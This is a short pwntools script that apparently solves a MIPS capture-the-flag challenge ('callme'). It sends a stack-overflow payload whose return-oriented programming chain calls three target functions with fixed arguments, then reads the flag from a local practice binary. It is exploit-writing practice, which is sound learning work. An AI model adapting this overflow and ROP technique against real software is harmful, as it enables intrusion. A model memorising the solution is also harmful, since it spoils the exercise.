from pwn import *

callme_one = 0x00400d20
callme_two = 0x00400d80
callme_three = 0x00400d10
lw_a0_a1_a2_t9_jalr = 0x00400bb0 # lw $a0, 0x10($sp) ; lw $a1, 0xc($sp) ; lw $a2, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; nop

payload = b"".join([
    b"A"*32,
    b"B"*4,
    p32(lw_a0_a1_a2_t9_jalr),
    b"C"*4,
    p32(callme_one),
    p32(0xd00df00d),
    p32(0xcafebabe),
    p32(0xdeadbeef),
    p32(lw_a0_a1_a2_t9_jalr),
    b"C"*4,
    p32(callme_two),
    p32(0xd00df00d),
    p32(0xcafebabe),
    p32(0xdeadbeef),
    p32(lw_a0_a1_a2_t9_jalr),
    b"C"*4,
    p32(callme_three),
    p32(0xd00df00d),
    p32(0xcafebabe),
    p32(0xdeadbeef),
])

#p = process(["qemu-mipsel", "-g", "1234", "./callme_mipsel"])
p = process("./callme_mipsel")
p.send(payload+b"\n")

#p.interactive()
p.recvuntil(b"correctly\n")
p.recvuntil(b"correctly\n")
flag = p.recv()
print(f"Flag : {flag}")
